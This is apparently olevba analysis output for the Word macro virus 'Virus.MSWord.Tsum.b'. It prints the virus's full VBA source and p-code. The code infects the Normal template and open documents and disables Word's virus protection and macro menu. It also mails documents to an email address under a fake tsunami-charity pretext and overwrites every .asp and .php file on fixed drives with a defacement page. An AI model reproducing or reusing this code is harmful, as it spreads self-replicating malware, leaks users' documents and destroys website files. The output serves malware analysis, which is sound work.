olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tsum.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tsum.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sunami.bas 
in file: Virus.MSWord.Tsum.b - OLE stream: 'Macros/VBA/sunami'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' hi there you have been attacked by sunami
' to get the rid of sunami drop me a mail at
' tsunami.india@indiatimes.com

Sub AutoExec()
    On Error Resume Next
    Call link2file
    Call hackSITE
End Sub

Sub AutoNew()
    On Error Resume Next
    Call link2file
End Sub

Sub AutoClose()
    On Error Resume Next
    Call link2file
    Call saveATTACK
    Call doSUNAMI
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub AutoExit()
    On Error Resume Next
    Call link2file
    Call saveATTACK
    Call doSUNAMI
End Sub

Sub AutoOpen()
    On Error Resume Next
    Call link2file
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub inspDIR()
    Dim MyFile, MyPath, MyName
    On Error Resume Next
    
    MyPath = "c:\sunami"
    MyName = Dir(MyPath, vbDirectory)
    
    If MyName = "" Then
     MkDir "c:\sunami"
    End If
   
End Sub

Sub saveATTACK()
    Dim no_of_docs, file1
    Dim myDate, myTime
    
    On Error Resume Next
    
    no_of_docs = Application.Documents.Count
    If no_of_docs < 1 Then Exit Sub
    
    myDate = Date
    myTime = Time
    
    s1 = Trim(Format(myDate, "dd~mmm~yyyy"))
    s2 = Trim(Format(myTime, "hh~mm~ss AMPM"))
    
    file1 = s1 + "(" + s2 + ")"
    
    Call inspDIR
    
    path1 = "c:\sunami\" + file1 + ".doc"
  
  ' this is ver 2.0 of my previous script -sa- -pa- -t- -tra
  ' if you still fill safe, wait i am going something real sunami
  ' be fill free to write to me at :   tsunami.india@indiatimes.com
  ' go ahead and donate for sunami victims.
  
  
    ActiveDocument.SaveAs FileName:=path1, FileFormat:=wdFormatDocument, _
        LockComments:=False, Password:="tsunami.india", AddToRecentFiles:=True, WritePassword _
        :="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
        SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        False
   
    Call doSUNAMI
End Sub


Function check2attack(location As Integer) As Boolean
    Dim mfile, ccount, index, filePROJ
    Dim signflag As Boolean
    Dim sigunature As String
    
    On Error Resume Next
    
    CommandBars("Tools").Controls("Macro").Enabled = False
   
    Application.DisplayAlerts = wdAlertsNone
    Application.ScreenUpdating = False
    Application.EnableCancelKey = wdCancelInterrupt
    Options.VirusProtection = False
    signature = "sunami"
    signflag = False
    
    If Application.Documents.Count < 1 Then
      check2attack = False
      Exit Function
    End If
    
    ' delete all other modules than sunami !
    Call checkOTHER
    
    Select Case location
      Case 1: Set filePROJ = ActiveDocument.VBProject
      Case 2: Set filePROJ = NormalTemplate.VBProject

      Case Else:
    End Select
    
    ccount = filePROJ.VBComponents.Count
    For i% = 1 To ccount
        mm$ = filePROJ.VBComponents.Item(i%).Name
        If Trim(mm$) = signature Then signflag = True
    Next i%
  
    check2attack = signflag
  
err_lbl:
End Function


Sub link2file()
    Dim ld, ln, mfile
        
    On Error Resume Next
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    
    'check for document
        ld = check2attack(1)
    
    'check for normal template
        ln = check2attack(2)
    
    mfile = "c:\acidtest.drv"
    
    If (ln And ld) Then
      'module is attached hence exit
      GoTo exit_label_2
    End If
    
    If (ld = False) Then
     'module is not attached to active document the attach to it
      Word.NormalTemplate.VBProject.VBComponents.Item("sunami").Export mfile
      Word.ActiveDocument.VBProject.VBComponents.Import mfile
      Kill mfile
      ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
    
    If (ln = False) Then
     'module is not attached to active document the attach to it
     Word.ActiveDocument.VBProject.VBComponents.Item("sunami").Export mfile
     Word.NormalTemplate.VBProject.VBComponents.Import mfile
     Kill mfile
     NormalTemplate.Save
    End If
    
exit_label_2:
End Sub
'-----------------------------------------------

Sub doSUNAMI()
    
    On Error Resume Next
    
    ActiveDocument.Save
    ActiveDocument.HasRoutingSlip = True
    With ActiveDocument.RoutingSlip
        .Subject = "Help Victims of sunami of India!"
        .AddRecipient "tsunami.india@indiatimes.com"
        .Delivery = wdAllAtOnce
    End With
    ActiveDocument.Route

    Call OutlookSEND
    
End Sub


Sub OutlookSEND()

    Dim bStarted As Boolean
    Dim oOutlookApp
    Dim oItem
    
    On Error Resume Next
    
  
    Set oOutlookApp = GetObject(, "Outlook.Application")
    If Err <> 0 Then
        Set oOutlookApp = CreateObject("Outlook.Application")
        bStarted = True
    End If
    
    Set oItem = oOutlookApp.CreateItem(olMailItem)
    
    With oItem
        .To = "tsunami.india@indiatimes.com"
        .Subject = "Help Victims of tsunami INDIA!!!"
        .Attachments.Add Source:=ActiveDocument.FullName, Type:=olByValue, DisplayName:="Please find attached file."
        .Send
    End With
    
    If bStarted Then
        oOutlookApp.Quit
    End If
    
    Set oItem = Nothing
    Set oOutlookApp = Nothing
    
End Sub
 
'-----------------------------------------------------------

Sub checkOTHER()
    Dim filePROJ, tmpCOMP
    Dim signflag As Boolean
    Dim sigunature As String
    
    On Error Resume Next
    
    ' remove all other modules other than sunami
    
    signature = "sunami"
    
    If Application.Documents.Count < 1 Then
          Exit Sub
    End If
    
    For location = 1 To 2
        Select Case location
          Case 1: Set filePROJ = ActiveDocument.VBProject
          Case 2: Set filePROJ = NormalTemplate.VBProject
    
          Case Else:
        End Select
        
        ccount = filePROJ.VBComponents.Count
        For i% = 1 To ccount
            mm$ = filePROJ.VBComponents.Item(i%).Name
            If Trim(mm$) <> signature And Trim(mm$) <> "ThisDocument" Then
              Set tmpCOMP = filePROJ.VBComponents.Item(i%)
              filePROJ.VBComponents.Remove tmpCOMP
            End If
        Next i%
  Next location

End Sub
'-----------------------------------------------------

Sub deleteFILE(drv As Variant, fType As String)
  Dim fs, d, dc, s, n
    
  On Error Resume Next
  
  Set fs = Application.FileSearch
  
  With fs
    .LookIn = drv
    .SearchSubFolders = True
    .FileName = fType
    
    If .Execute() > 0 Then
        For i = 1 To .FoundFiles.Count
          s = .FoundFiles(i)
          writeNEWASP (s)
        Next i
    End If
  
  End With

End Sub


Sub hackSITE()
    Dim fs, d, dc, s
    
    On Error Resume Next
    
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set dc = fs.Drives
    
    For Each d In dc
        s = d.DriveLetter
        
        Select Case d.DriveType
            Case 0: GoTo label1  ' Unknown
            Case 1: GoTo label1  ' Removable
            Case 2: s = s & ":\" ' Fixed
            Case 3: GoTo label1  ' Network
            Case 4: GoTo label1  ' CD-ROM
            Case 5: GoTo label1  ' RAM Disk
        End Select
       
     Call deleteFILE(s, "*.asp")
     Call deleteFILE(s, "*.php")
     Call deleteFILE(s, "*.aspx")
     Call deleteFILE(s, "*.php3")

label1:
    Next
    
End Sub

'----------------------------------------------------
Sub writeNEWASP(p As String)
   On Error Resume Next
   
   Kill p
   
   Open p For Output As #1
   
   Print #1, "<html>"
   Print #1, "<body bgcolor=#FF0000>"
   Print #1, "<h1> This website has been hacked by IndiaMaster </h1>"
   Print #1, "<p>"
   Print #1, "<p>"
   Print #1, "<p>"
   Print #1, "<h2> drop me mail at: <a>tsunami.india@indiatimes.com</a></h2>"
   Print #1, "</body>"
   Print #1, "</html>"
   
   Close #1
   
   
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Tsum.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/sunami - 15197 bytes
' Line #0:
' 	QuoteRem 0x0000 0x002A " hi there you have been attacked by sunami"
' Line #1:
' 	QuoteRem 0x0000 0x002B " to get the rid of sunami drop me a mail at"
' Line #2:
' 	QuoteRem 0x0000 0x001D " tsunami.india@indiatimes.com"
' Line #3:
' Line #4:
' 	FuncDefn (Sub AutoExec())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	ArgsCall (Call) link2file 0x0000 
' Line #7:
' 	ArgsCall (Call) hackSITE 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Sub AutoNew())
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	ArgsCall (Call) link2file 0x0000 
' Line #13:
' 	EndSub 
' Line #14:
' Line #15:
' 	FuncDefn (Sub AutoClose())
' Line #16:
' 	OnError (Resume Next) 
' Line #17:
' 	ArgsCall (Call) link2file 0x0000 
' Line #18:
' 	ArgsCall (Call) saveATTACK 0x0000 
' Line #19:
' 	ArgsCall (Call) doSUNAMI 0x0000 
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #21:
' 	EndSub 
' Line #22:
' Line #23:
' 	FuncDefn (Sub AutoExit())
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	ArgsCall (Call) link2file 0x0000 
' Line #26:
' 	ArgsCall (Call) saveATTACK 0x0000 
' Line #27:
' 	ArgsCall (Call) doSUNAMI 0x0000 
' Line #28:
' 	EndSub 
' Line #29:
' Line #30:
' 	FuncDefn (Sub AutoOpen())
' Line #31:
' 	OnError (Resume Next) 
' Line #32:
' 	ArgsCall (Call) link2file 0x0000 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub inspDIR())
' Line #36:
' 	Dim 
' 	VarDefn MyFile
' 	VarDefn MyPath
' 	VarDefn MyName
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' Line #39:
' 	LitStr 0x0009 "c:\sunami"
' 	St MyPath 
' Line #40:
' 	Ld MyPath 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St MyName 
' Line #41:
' Line #42:
' 	Ld MyName 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #43:
' 	LitStr 0x0009 "c:\sunami"
' 	ArgsCall MkDir 0x0001 
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' 	EndSub 
' Line #47:
' Line #48:
' 	FuncDefn (Sub saveATTACK())
' Line #49:
' 	Dim 
' 	VarDefn no_of_docs
' 	VarDefn file1
' Line #50:
' 	Dim 
' 	VarDefn myDate
' 	VarDefn myTime
' Line #51:
' Line #52:
' 	OnError (Resume Next) 
' Line #53:
' Line #54:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St no_of_docs 
' Line #55:
' 	Ld no_of_docs 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #56:
' Line #57:
' 	Ld Date 
' 	St myDate 
' Line #58:
' 	Ld Time 
' 	St myTime 
' Line #59:
' Line #60:
' 	Ld myDate 
' 	LitStr 0x000B "dd~mmm~yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St s1 
' Line #61:
' 	Ld myTime 
' 	LitStr 0x000D "hh~mm~ss AMPM"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St s2 
' Line #62:
' Line #63:
' 	Ld s1 
' 	LitStr 0x0001 "("
' 	Add 
' 	Ld s2 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	St file1 
' Line #64:
' Line #65:
' 	ArgsCall (Call) inspDIR 0x0000 
' Line #66:
' Line #67:
' 	LitStr 0x000A "c:\sunami\"
' 	Ld file1 
' 	Add 
' 	LitStr 0x0004 ".doc"
' 	Add 
' 	St path1 
' Line #68:
' Line #69:
' 	QuoteRem 0x0002 0x0039 " this is ver 2.0 of my previous script -sa- -pa- -t- -tra"
' Line #70:
' 	QuoteRem 0x0002 0x003E " if you still fill safe, wait i am going something real sunami"
' Line #71:
' 	QuoteRem 0x0002 0x0040 " be fill free to write to me at :   tsunami.india@indiatimes.com"
' Line #72:
' 	QuoteRem 0x0002 0x0028 " go ahead and donate for sunami victims."
' Line #73:
' Line #74:
' Line #75:
' 	LineCont 0x0010 0B 00 08 00 18 00 08 00 23 00 08 00 2D 00 08 00
' 	Ld path1 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x000D "tsunami.india"
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #76:
' Line #77:
' 	ArgsCall (Call) doSUNAMI 0x0000 
' Line #78:
' 	EndSub 
' Line #79:
' Line #80:
' Line #81:
' 	FuncDefn (Function check2attack(location As Integer) As Boolean)
' Line #82:
' 	Dim 
' 	VarDefn mfile
' 	VarDefn ccount
' 	VarDefn index
' 	VarDefn filePROJ
' Line #83:
' 	Dim 
' 	VarDefn signflag (As Boolean)
' Line #84:
' 	Dim 
' 	VarDefn sigunature (As String)
' Line #85:
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' Line #88:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #89:
' Line #90:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #91:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #92:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #93:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #94:
' 	LitStr 0x0006 "sunami"
' 	St signature 
' Line #95:
' 	LitVarSpecial (False)
' 	St signflag 
' Line #96:
' Line #97:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #98:
' 	LitVarSpecial (False)
' 	St check2attack 
' Line #99:
' 	ExitFunc 
' Line #100:
' 	EndIfBlock 
' Line #101:
' Line #102:
' 	QuoteRem 0x0004 0x0027 " delete all other modules than sunami !"
' Line #103:
' 	ArgsCall (Call) checkOTHER 0x0000 
' Line #104:
' Line #105:
' 	Ld location 
' 	SelectCase 
' Line #106:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set filePROJ 
' Line #107:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set filePROJ 
' Line #108:
' Line #109:
' 	CaseElse 
' 	BoS 0x0000 
' Line #110:
' 	EndSelect 
' Line #111:
' Line #112:
' 	Ld filePROJ 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ccount 
' Line #113:
' 	StartForVariable 
' 	Ld i% 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ccount 
' 	For 
' Line #114:
' 	Ld i% 
' 	Ld filePROJ 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St mm$ 
' Line #115:
' 	Ld mm$ 
' 	ArgsLd Trim 0x0001 
' 	Ld signature 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St signflag 
' 	EndIf 
' Line #116:
' 	StartForVariable 
' 	Ld i% 
' 	EndForVariable 
' 	NextVar 
' Line #117:
' Line #118:
' 	Ld signflag 
' 	St check2attack 
' Line #119:
' Line #120:
' 	Label err_lbl 
' Line #121:
' 	EndFunc 
' Line #122:
' Line #123:
' Line #124:
' 	FuncDefn (Sub link2file())
' Line #125:
' 	Dim 
' 	VarDefn ld
' 	VarDefn ln
' 	VarDefn mfile
' Line #126:
' Line #127:
' 	OnError (Resume Next) 
' Line #128:
' Line #129:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #130:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #131:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #132:
' Line #133:
' 	QuoteRem 0x0004 0x0012 "check for document"
' Line #134:
' 	LitDI2 0x0001 
' 	ArgsLd check2attack 0x0001 
' 	St ld 
' Line #135:
' Line #136:
' 	QuoteRem 0x0004 0x0019 "check for normal template"
' Line #137:
' 	LitDI2 0x0002 
' 	ArgsLd check2attack 0x0001 
' 	St ln 
' Line #138:
' Line #139:
' 	LitStr 0x000F "c:\acidtest.drv"
' 	St mfile 
' Line #140:
' Line #141:
' 	Ld ln 
' 	Ld ld 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #142:
' 	QuoteRem 0x0006 0x001D "module is attached hence exit"
' Line #143:
' 	GoTo exit_label_2 
' Line #144:
' 	EndIfBlock 
' Line #145:
' Line #146:
' 	Ld ld 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #147:
' 	QuoteRem 0x0005 0x003A "module is not attached to active document the attach to it"
' Line #148:
' 	Ld mfile 
' 	LitStr 0x0006 "sunami"
' 	Ld Word 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #149:
' 	Ld mfile 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #150:
' 	Ld mfile 
' 	ArgsCall Kill 0x0001 
' Line #151:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #152:
' 	EndIfBlock 
' Line #153:
' Line #154:
' 	Ld ln 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #155:
' 	QuoteRem 0x0005 0x003A "module is not attached to active document the attach to it"
' Line #156:
' 	Ld mfile 
' 	LitStr 0x0006 "sunami"
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #157:
' 	Ld mfile 
' 	Ld Word 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #158:
' 	Ld mfile 
' 	ArgsCall Kill 0x0001 
' Line #159:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #160:
' 	EndIfBlock 
' Line #161:
' Line #162:
' 	Label exit_label_2 
' Line #163:
' 	EndSub 
' Line #164:
' 	QuoteRem 0x0000 0x002F "-----------------------------------------------"
' Line #165:
' Line #166:
' 	FuncDefn (Sub doSUNAMI())
' Line #167:
' Line #168:
' 	OnError (Resume Next) 
' Line #169:
' Line #170:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #171:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt HasRoutingSlip 
' Line #172:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd RoutingSlip 
' 	With 
' Line #173:
' 	LitStr 0x0020 "Help Victims of sunami of India!"
' 	MemStWith Subject 
' Line #174:
' 	LitStr 0x001C "tsunami.india@indiatimes.com"
' 	ArgsMemCallWith AddRecipient 0x0001 
' Line #175:
' 	Ld wdAllAtOnce 
' 	MemStWith Delivery 
' Line #176:
' 	EndWith 
' Line #177:
' 	Ld ActiveDocument 
' 	ArgsMemCall Route 0x0000 
' Line #178:
' Line #179:
' 	ArgsCall (Call) OutlookSEND 0x0000 
' Line #180:
' Line #181:
' 	EndSub 
' Line #182:
' Line #183:
' Line #184:
' 	FuncDefn (Sub OutlookSEND())
' Line #185:
' Line #186:
' 	Dim 
' 	VarDefn bStarted (As Boolean)
' Line #187:
' 	Dim 
' 	VarDefn oOutlookApp
' Line #188:
' 	Dim 
' 	VarDefn oItem
' Line #189:
' Line #190:
' 	OnError (Resume Next) 
' Line #191:
' Line #192:
' Line #193:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set oOutlookApp 
' Line #194:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #195:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set oOutlookApp 
' Line #196:
' 	LitVarSpecial (True)
' 	St bStarted 
' Line #197:
' 	EndIfBlock 
' Line #198:
' Line #199:
' 	SetStmt 
' 	Ld olMailItem 
' 	Ld oOutlookApp 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set oItem 
' Line #200:
' Line #201:
' 	StartWithExpr 
' 	Ld oItem 
' 	With 
' Line #202:
' 	LitStr 0x001C "tsunami.india@indiatimes.com"
' 	MemStWith True 
' Line #203:
' 	LitStr 0x0020 "Help Victims of tsunami INDIA!!!"
' 	MemStWith Subject 
' Line #204:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld olByValue 
' 	ParamNamed TypeOf 
' 	LitStr 0x001A "Please find attached file."
' 	ParamNamed DisplayName 
' 	MemLdWith Attachments 
' 	ArgsMemCall Add 0x0003 
' Line #205:
' 	ArgsMemCallWith Send 0x0000 
' Line #206:
' 	EndWith 
' Line #207:
' Line #208:
' 	Ld bStarted 
' 	IfBlock 
' Line #209:
' 	Ld oOutlookApp 
' 	ArgsMemCall Quit 0x0000 
' Line #210:
' 	EndIfBlock 
' Line #211:
' Line #212:
' 	SetStmt 
' 	LitNothing 
' 	Set oItem 
' Line #213:
' 	SetStmt 
' 	LitNothing 
' 	Set oOutlookApp 
' Line #214:
' Line #215:
' 	EndSub 
' Line #216:
' Line #217:
' 	QuoteRem 0x0000 0x003B "-----------------------------------------------------------"
' Line #218:
' Line #219:
' 	FuncDefn (Sub checkOTHER())
' Line #220:
' 	Dim 
' 	VarDefn filePROJ
' 	VarDefn tmpCOMP
' Line #221:
' 	Dim 
' 	VarDefn signflag (As Boolean)
' Line #222:
' 	Dim 
' 	VarDefn sigunature (As String)
' Line #223:
' Line #224:
' 	OnError (Resume Next) 
' Line #225:
' Line #226:
' 	QuoteRem 0x0004 0x002B " remove all other modules other than sunami"
' Line #227:
' Line #228:
' 	LitStr 0x0006 "sunami"
' 	St signature 
' Line #229:
' Line #230:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #231:
' 	ExitSub 
' Line #232:
' 	EndIfBlock 
' Line #233:
' Line #234:
' 	StartForVariable 
' 	Ld location 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #235:
' 	Ld location 
' 	SelectCase 
' Line #236:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set filePROJ 
' Line #237:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set filePROJ 
' Line #238:
' Line #239:
' 	CaseElse 
' 	BoS 0x0000 
' Line #240:
' 	EndSelect 
' Line #241:
' Line #242:
' 	Ld filePROJ 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ccount 
' Line #243:
' 	StartForVariable 
' 	Ld i% 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ccount 
' 	For 
' Line #244:
' 	Ld i% 
' 	Ld filePROJ 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St mm$ 
' Line #245:
' 	Ld mm$ 
' 	ArgsLd Trim 0x0001 
' 	Ld signature 
' 	Ne 
' 	Ld mm$ 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #246:
' 	SetStmt 
' 	Ld i% 
' 	Ld filePROJ 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set tmpCOMP 
' Line #247:
' 	Ld tmpCOMP 
' 	Ld filePROJ 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #248:
' 	EndIfBlock 
' Line #249:
' 	StartForVariable 
' 	Ld i% 
' 	EndForVariable 
' 	NextVar 
' Line #250:
' 	StartForVariable 
' 	Ld location 
' 	EndForVariable 
' 	NextVar 
' Line #251:
' Line #252:
' 	EndSub 
' Line #253:
' 	QuoteRem 0x0000 0x0035 "-----------------------------------------------------"
' Line #254:
' Line #255:
' 	FuncDefn (Sub deleteFILE(drv As Variant, fType As String))
' Line #256:
' 	Dim 
' 	VarDefn fs
' 	VarDefn d
' 	VarDefn dc
' 	VarDefn s
' 	VarDefn n
' Line #257:
' Line #258:
' 	OnError (Resume Next) 
' Line #259:
' Line #260:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #261:
' Line #262:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #263:
' 	Ld drv 
' 	MemStWith LookIn 
' Line #264:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #265:
' 	Ld fType 
' 	MemStWith FileName 
' Line #266:
' Line #267:
' 	ArgsMemLdWith Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #268:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #269:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St s 
' Line #270:
' 	Ld s 
' 	Paren 
' 	ArgsCall writeNEWASP 0x0001 
' Line #271:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #272:
' 	EndIfBlock 
' Line #273:
' Line #274:
' 	EndWith 
' Line #275:
' Line #276:
' 	EndSub 
' Line #277:
' Line #278:
' Line #279:
' 	FuncDefn (Sub hackSITE())
' Line #280:
' 	Dim 
' 	VarDefn fs
' 	VarDefn d
' 	VarDefn dc
' 	VarDefn s
' Line #281:
' Line #282:
' 	OnError (Resume Next) 
' Line #283:
' Line #284:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #285:
' 	SetStmt 
' 	Ld fs 
' 	MemLd Drives 
' 	Set dc 
' Line #286:
' Line #287:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld dc 
' 	ForEach 
' Line #288:
' 	Ld d 
' 	MemLd DriveLetter 
' 	St s 
' Line #289:
' Line #290:
' 	Ld d 
' 	MemLd DriveType 
' 	SelectCase 
' Line #291:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	GoTo label1 
' 	QuoteRem 0x0021 0x0008 " Unknown"
' Line #292:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	GoTo label1 
' 	QuoteRem 0x0021 0x000A " Removable"
' Line #293:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld s 
' 	LitStr 0x0002 ":\"
' 	Concat 
' 	St s 
' 	QuoteRem 0x0021 0x0006 " Fixed"
' Line #294:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	GoTo label1 
' 	QuoteRem 0x0021 0x0008 " Network"
' Line #295:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	GoTo label1 
' 	QuoteRem 0x0021 0x0007 " CD-ROM"
' Line #296:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	GoTo label1 
' 	QuoteRem 0x0021 0x0009 " RAM Disk"
' Line #297:
' 	EndSelect 
' Line #298:
' Line #299:
